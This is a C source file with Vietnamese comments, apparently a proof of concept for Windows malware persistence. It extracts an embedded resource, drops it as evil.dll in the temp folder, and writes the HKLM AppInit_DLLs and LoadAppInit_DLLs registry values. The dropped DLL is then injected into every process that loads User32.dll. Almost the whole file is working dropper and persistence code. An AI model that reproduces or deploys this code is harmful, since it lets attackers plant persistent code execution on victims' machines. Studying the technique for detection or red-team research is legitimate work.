#include "MyRegistry.h"
#include "resource.h"
#include <tchar.h>

/*
** Mô tả:
** - AppInit_DLLs là cơ chế cho phép load tệp DLL vào các tiến trình có sử dụng User32.dll => Hầu hết đều sử dụng.
** - Đây là một giá trị trong Registry, nó chứa đường dẫn các tệp DLL (Ngăn cách bằng dấu phẩy)
** - Từ Windows 8 thì AppInit_DLLs không được bật theo mặc định.
**  => Cần phải set biến "LoadAppInit_DLLs" thành 1 để nó đc bật tự động.
** PoC:
** - Dropped tệp DLL vào %TEMP%
** - Vị trí khóa: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
** - Set giá trị cho 2 biến:
**		"AppInit_DLLs"="\Path\To\evil.dll"
**		"LoadAppInit_DLLs"="1"
** - Mỗi khi run một chương trình có nạp User32.dll thì evil.dll cũng sẽ được nạp
** - Note: 
**		+ Chạy x32/x64 ứng với đúng hệ điều hành 32/64 bits
**		+ Với mỗi hệ điều hành 32/64 bits thì dropped dll bản 32/64 tương ứng.
**		=> Nếu OS 64 bit mà dropped dll 32 bit thì chỉ hoạt động khi run các app 32 bit.
** Ref:
** 1. Reading And Writing Windows Registry Using WinAPI
**	https://aticleworld.com/reading-and-writing-windows-registry/
*/


int main()
{
	// *** Stage 1: Find and load resource ***
	HRSRC	hRes;			 // handle/ptr resource
	HGLOBAL	hResLoad;		 // handle to loaded resource
	LPVOID	lpResLock;		 // pointer to resource data

	// Locate the resource in file.
	printf(" [+] Finding resource.\n");
	Sleep(500);

	hRes = FindResourceA(
		NULL,		// locate resource current process
		101,		// name of resource (resource ID)
		"BIN");		// type of resource
	if (hRes == NULL) {
		printf(" [-] Could not locate resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Load the resource into global memory.
	hResLoad = LoadResource(
		NULL,	// current process
		hRes);	// handle to the resource
	if (hResLoad == NULL) {
		printf(" [-] Could not load resource. Error Code = %d\n", GetLastError());
		return;
	}

	// Lock the resource into global memory.
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		printf(" [-] Could not lock resource. Error Code = %d\n", GetLastError());
		return;
	}


	// *** Stage 2: Dropped/Extract/Write resource binary to file ***
	DWORD	dwSizeOfRes = 0;			// size (bytes) of the specified resource
	TCHAR	filePath[MAX_PATH];			// full path of file dropped
	TCHAR	lpTempPathBuffer[MAX_PATH];	// path of temp directory
	DWORD	dwRetVal = 0;				// temp variable

	printf(" [+] Dropping evil file.\n");
	Sleep(500);

	// Calculating size of resource
	dwSizeOfRes = SizeofResource(
		NULL,	// current process
		hRes);	// handle/ptr resource

	// Get the temp path env
	dwRetVal = GetTempPath(
		MAX_PATH,          // length of the buffer
		lpTempPathBuffer); // buffer for path 
	if (dwRetVal > MAX_PATH || (dwRetVal == 0)) {
		printf(" [-] Could not get temp path. Error Code = %d\n", GetLastError());
		return;
	}

	// Generates a temporary file name.
	wsprintfA(filePath, TEXT("%sevil.dll"), lpTempPathBuffer);

	HANDLE	hFileWriter;
	DWORD	dwBytesWritten = 0;
	BOOL	bErrorFlag = FALSE;

	// Create dropped file
	hFileWriter = CreateFile(
		filePath,				// name of the write
		GENERIC_WRITE,			// open for writing
		NULL,					// do not share
		NULL,					// default security
		CREATE_NEW,				// create new file only
		FILE_ATTRIBUTE_NORMAL,	// normal file
		NULL);					// no attr. template
	if (hFileWriter == INVALID_HANDLE_VALUE) {
		printf(" [-] Terminal failure: Unable to open file \"%s\" for write. Error Code = %d\n", filePath, GetLastError());
		return;
	}

	printf(" [+] Writing %d bytes to \"%s\".\n", dwSizeOfRes, filePath);
	Sleep(500);

	bErrorFlag = WriteFile(
		hFileWriter,		// open file handle
		lpResLock,			// start of data to write
		dwSizeOfRes,		// number of bytes to write
		&dwBytesWritten,	// number of bytes that were written
		NULL);				// no overlapped structure
	if (FALSE == bErrorFlag) {
		printf(" [-] Terminal failure: Unable to write to \"%s\". Error Code = %d\n", filePath, GetLastError());
	}
	else {
		if (dwBytesWritten != dwSizeOfRes) {
			printf(" [-] Error: dwBytesWritten != dwSizeOfRes. Error Code = %d\n", GetLastError());
		}
		else {
			printf(" [+] Wrote %d bytes to \"%s\" successfully.\n", dwBytesWritten, filePath);
		}
	}
	CloseHandle(hFileWriter);

	// *** Stage 3: Persistence via AppInit_DLLs Registry ***
	// Write to: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
	// AppInit_DLLs=\Path\To\evil.dll, LoadAppInit_DLLs=1

	BOOL status = FALSE;
	Sleep(500);
	printf(" [+] Setting up Persistence via AppInit_DLLs Registry.\n");

	// Write to AppInit_DLLs
	status = WriteStringToRegistry(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		"AppInit_DLLs",
		(PWCHAR)filePath); // write string
	if (status != TRUE) {
		printf(" [-] Error write string to AppInit_DLLs. Code = %d\n", GetLastError());
		return;
	}

	// Write to LoadAppInit_DLLs
	status = FALSE;
	status = WriteDwordToRegistry(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		"LoadAppInit_DLLs",
		1); // write dword
	if (status != TRUE) {
		printf(" [-] Error write string to LoadAppInit_DLLs. Code = %d\n", GetLastError());
		return;
	}

	Sleep(500);
	printf(" [+] Successfully. Goodbye!\n");

	return 0;
}